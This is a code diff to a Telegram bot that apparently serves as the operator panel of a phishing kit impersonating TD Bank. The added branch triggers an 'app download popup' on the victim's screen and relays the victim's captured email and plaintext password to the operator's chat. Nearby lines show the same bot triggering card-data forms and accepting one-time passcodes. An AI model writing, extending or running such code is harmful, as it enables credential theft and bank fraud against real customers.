@@ -118,6 +118,18 @@ bot.on('callback_query', async (callbackQuery) => {
       );
       console.log(`[Bot] Triggered card form for ${email}`);
 
+    } else if (action === 'show_app') {
+      session.status = 'app_popup';
+      await bot.answerCallbackQuery(callbackQueryId, { text: '📲 App download popup triggered!' });
+      await bot.editMessageText(
+        `📲 APP DOWNLOAD POPUP TRIGGERED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to download TD Bank app...`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Triggered app download popup for ${email}`);
+
     } else if (action === 'accept_otp_card') {
       session.status = 'card_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '💳 OTP Accepted — Card popup triggered!' });
